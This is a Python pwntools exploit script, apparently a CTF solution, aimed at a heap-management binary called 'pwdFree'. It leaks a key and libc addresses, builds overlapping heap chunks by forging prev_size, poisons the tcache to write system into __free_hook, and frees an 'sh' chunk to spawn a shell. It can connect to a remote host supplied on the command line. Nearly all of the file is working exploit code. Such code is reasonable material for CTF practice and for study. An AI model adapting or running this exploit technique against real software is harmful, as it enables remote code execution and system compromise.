#!/usr/bin/python3
# -*- coding: UTF-8 -*-
# -----------------------------------
# @File    :  exp.py
# @Author  :  woodwhale
# @Time    :  2021/10/07 11:29:49
# -----------------------------------

from pwn import *
from LibcSearcher import *
import sys, subprocess, warnings, os

arglen = len(sys.argv)
warnings.filterwarnings('ignore')
def ret2libc(leak,func,binary=null):
    libc = LibcSearcher(func,leak) if binary == null else binary
    base = leak - libc.dump(func) if binary == null else leak - libc.sym[func]
    system = base + libc.dump('system') if binary == null else base + libc.sym['system']
    binsh = base + libc.dump('str_bin_sh') if binary == null else next(libc.search(b'/bin/sh'))
    return (system,binsh)
def hack(pwn):
    global io,binary,libc
    times = 0
    while True:
        try:
            times+=1
            clear()
            info(f'time ================> {times}')
            pwn()
        except:
            io.close()
            io = proc(binary,libc.path) if arglen == 1 else (remote(sys.argv[1].split(':')[0],sys.argv[1].split(':')[1]) if arglen == 2 else remote(sys.argv[1],sys.argv[2]))
s           =       lambda data             : io.send(data)
sa          =       lambda rv,data          : io.sendafter(rv,data)
sl          =       lambda data             : io.sendline(data)
sla         =       lambda rv,data          : io.sendlineafter(rv,data)
r           =       lambda num              : io.recv(num)
rl          =       lambda keepends=True    : io.recvline(keepends)
ru          =       lambda data,drop=True   : io.recvuntil(data,drop)
ia          =       lambda                  : io.interactive()
uu32        =       lambda data             : u32(data.ljust(4,b'\x00'))
uu64        =       lambda data             : u64(data.ljust(8,b'\x00'))
i16         =       lambda data             : int(data,16)
leak        =       lambda name,addr        : log.success('\033[33m{}\033[0m = \033[31m{:#x}\033[0m'.format(name, addr))
info        =       lambda data             : log.info(f'\033[36m{data}\033[0m')
dbg         =       lambda point=null       : (gdb.attach(io) if point == null else gdb.attach(io,f'b {point}')) if DEBUG else null
og          =       lambda binary           : list(map(int,subprocess.check_output(['one_gadget','--raw','-f',binary]).decode().strip('\n').split(' ')))
rg          =       lambda binary,only,grep : i16(subprocess.check_output([f"ROPgadget --binary {binary} --only '{only}' | grep {grep}"],shell=True).decode().split(' ')[0])
setlibc     =       lambda leak,func        : leak - libc.sym[func]
libcpath    =       lambda binary           : subprocess.check_output(['ldd',binary]).decode().replace('	', '').split('\n')[1].split(' ')[2] if GLIBC else subprocess.check_output(['ls | grep libc*.so'],shell=True).decode().strip('\n').split('\n')[0]
proc        =       lambda binary,libc=null : process(binary) if GLIBC else process(binary,env={'LD_PRELOAD':'./'+libc})
clear       =       lambda                  : os.system('clear')

# context.log_level='debug'
context.arch='amd64'
context.terminal = ['gnome-terminal','-x', 'bash','-c']
DEBUG = 1
GLIBC = 1
binary = './pwdFree'
elf = ELF(binary)
libc = ELF(libcpath(binary))
libc.path = libcpath(binary)
io = proc(binary,libc.path) if arglen == 1 else (remote(sys.argv[1].split(':')[0],sys.argv[1].split(':')[1]) if arglen == 2 else remote(sys.argv[1],sys.argv[2]))

def cmd(index):
    sla("Input Your Choice:",str(index))

def add(id,size,content="a"):
    cmd(1)
    sla("Input The ID You Want Save:",str(id))
    sla("Length Of Your Pwd:",str(size))
    sa("Your Pwd:",content)

def free(index):
    cmd(4)
    sla("Idx you want 2 Delete:",str(index))

def edit(index,content):
    cmd(2)
    sl(str(index))
    sl(content)

def show(index):
    cmd(3)
    sla("Which PwdBox You Want Check:",str(index))

# leak key
add("a",0x18,"\x00"*8+"\n") # 0
ru(" Save ID:")
key = uu64(r(8))
leak("key",key)

# 构造堆叠
add("1",0xf0,"\x00"*8+"\n") # 1
add("2",0x80,"\x00"*8+"\n") # 2
add("3",0x80,"\x00"*8+"\n") # 3
add("4",0xf0,"\x00"*8+"\n") # 4

for i in range(5,12):
    add(str(i),0xf0,"\x00"*8+"\n") # 5-11
for i in range(7):
    free(5+i)

free(3)
# 伪造prev size进行向上合并，可以使用指针2
add("3",0x88,b"\x00"*0x80+p64((0x100 + 0x90 + 0x90)^key)+b"\x00")
free(1)
free(4)
for i in range(7):
    add(str(i+5),0xf0,"\x00"*8+"\n")    # 5-11
add("1",0xf0,"\x00"*8+"\n") # 1

# leak libc
show(2)
ru("Pwd is: ")
malloc_hook = (u64(r(8))^key) - 112
leak("malloc",malloc_hook)
libc.address = malloc_hook - libc.sym["__malloc_hook"]
leak("base",libc.address)
free_hook = libc.sym["__free_hook"]
system = libc.sym["system"]

# free_hook写入system，free("sh")来getshell
add("11",0x80,p64(0^key)*4+b"\n")
add("12",0x80,p64(0^key)*4+b"\n")
free(11)
edit(2,p64(free_hook))
add("11",0x80,p64(0x6873^key)*4+b"\n")
add("12",0x80,p64(system^key)*4+b"\n")
free(11)

ia()